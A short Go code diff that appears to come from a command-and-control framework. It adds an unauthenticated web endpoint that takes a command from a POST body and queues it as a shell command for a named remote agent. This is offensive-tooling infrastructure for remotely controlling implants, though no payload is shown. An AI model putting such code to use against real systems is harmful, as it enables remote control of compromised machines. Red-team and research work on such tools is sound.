@@ -6,6 +6,7 @@ import (
 
 	"github.com/PatronC2/Patron/data"
 	"github.com/go-chi/chi"
+	"github.com/google/uuid"
 	"github.com/qkgo/yin"
 	"github.com/s-christian/gollehs/lib/logger"
 )
@@ -30,6 +31,17 @@ func main() {
 		res, _ := yin.Event(w, r)
 		agent := data.Agent(agentParam)
 		res.SendJSON(agent)
+	})
+
+	r.Post("/api/agent/{agt}", func(w http.ResponseWriter, r *http.Request) {
+		res, req := yin.Event(w, r)
+		agentParam := chi.URLParam(r, "agt")
+		newCmdID := uuid.New().String()
+		body := map[string]string{}
+		req.BindBody(&body)
+		data.SendAgentCommand(agentParam, "0", "shell", body["command"], newCmdID) // from web
+		// res.SendString(agentParam + "0" + "shell" + body["command"] + newCmdID)
+		res.SendStatus(200)
 	})
 
 	http.ListenAndServe(":3000", r)
